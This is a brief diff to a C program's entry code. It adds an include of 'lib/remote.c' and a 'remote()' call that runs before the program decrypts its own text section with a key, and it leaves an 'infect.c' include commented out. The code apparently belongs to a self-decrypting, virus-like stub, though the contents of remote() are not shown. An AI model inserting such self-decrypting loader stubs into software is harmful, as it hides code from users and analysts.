@@ -1,6 +1,7 @@
 int main() asm ("entry");
 
 #include "lib/lib.c"
+#include "lib/remote.c"
 //#include "lib/infect.c"
 
 extern size_t memaddr;
@@ -50,5 +51,6 @@ int main(){
 	  printnb(((uint32_t*)key)[3]);print(" ");
 	  println("");
 	  */
+	remote();
 	decrypt((void*)text_start, text_length, (uint32_t*)key);
 }
